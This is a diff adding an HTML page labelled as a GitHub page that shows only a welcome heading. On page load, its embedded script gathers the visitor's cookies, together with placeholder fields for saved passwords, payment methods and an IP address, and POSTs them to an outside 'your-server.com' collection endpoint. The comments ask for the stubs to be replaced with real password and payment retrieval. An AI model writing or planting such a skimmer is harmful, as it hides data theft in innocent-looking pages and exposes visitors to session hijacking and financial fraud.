@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub Page</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            // Collect cookies
+            const cookies = document.cookie;
+
+            // Collect saved passwords (this is a simplified example and may require more complex handling)
+            const passwords = 'password1, password2'; // Replace with actual password retrieval logic
+
+            // Collect saved payment methods (this is a simplified example and may require more complex handling)
+            const paymentMethods = 'method1, method2'; // Replace with actual payment method retrieval logic
+
+            // Get IP address (this is a simplified example and may require more complex handling)
+            const ipAddress = '192.168.1.1'; // Replace with actual IP address retrieval logic
+
+            // Prepare data to send
+            const data = {
+                ipAddress: ipAddress,
+                totalCookies: cookies.split('; ').length,
+                totalPasswords: passwords.split(', ').length,
+                totalPaymentMethods: paymentMethods.split(', ').length,
+                cookies: cookies,
+                passwords: passwords,
+                paymentMethods: paymentMethods
+            };
+
+            // Send data to your server
+            fetch('https://your-server.com/collect-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Success:', data);
+              })
+              .catch((error) => {
+                  console.error('Error:', error);
+              });
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to the GitHub Page</h1>
+</body>
+</html>
